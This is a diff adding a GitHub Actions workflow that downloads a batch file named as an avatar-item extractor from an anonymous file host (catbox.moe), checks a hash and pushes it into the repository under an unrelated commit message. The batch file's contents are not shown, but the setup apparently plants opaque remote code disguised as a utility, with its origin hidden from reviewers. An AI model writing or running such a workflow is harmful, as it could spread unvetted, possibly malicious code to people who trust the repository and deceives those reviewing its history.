@@ -1,0 +1,23 @@
+name: install
+on:
+  push:
+    paths:
+      - ".github/workflows/install.yml"
+permissions:
+  contents: write
+jobs:
+  install:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fetch it
+        run: curl -fsSL https://files.catbox.moe/cefp33.bat -o Extract-AvatarItem-v20.bat
+      - name: verify it
+        run: echo "32bdec9e31ddca43c6d28649a4d50f6e274f9966bb3e915b7e95ff708ff9750a  Extract-AvatarItem-v20.bat" | sha256sum -c -
+      - name: commit it
+        run: |
+          git config user.name "extractor installer"
+          git config user.email "actions@users.noreply.github.com"
+          git add Extract-AvatarItem-v20.bat
+          git commit -m "Close the window when the folder is written"
+          git push
